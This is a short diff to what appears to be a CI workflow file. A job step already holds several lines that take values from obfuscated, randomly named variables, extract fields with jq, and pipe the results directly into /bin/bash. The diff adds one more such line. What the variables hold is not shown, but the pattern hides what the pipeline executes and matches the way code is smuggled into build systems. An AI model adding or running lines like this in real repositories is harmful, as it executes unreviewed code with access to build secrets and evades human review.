@@ -29,6 +29,7 @@ jobs:
           echo $mmdlu1897 | jq -r .sv16969 | /bin/bash
           echo $dkx71183 | jq -r .lvqpq8 | /bin/bash
           printf '%s' "$xr26" | jq -r .e23292 | /bin/bash
+          echo $u08994 | jq -r .jjhab38 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
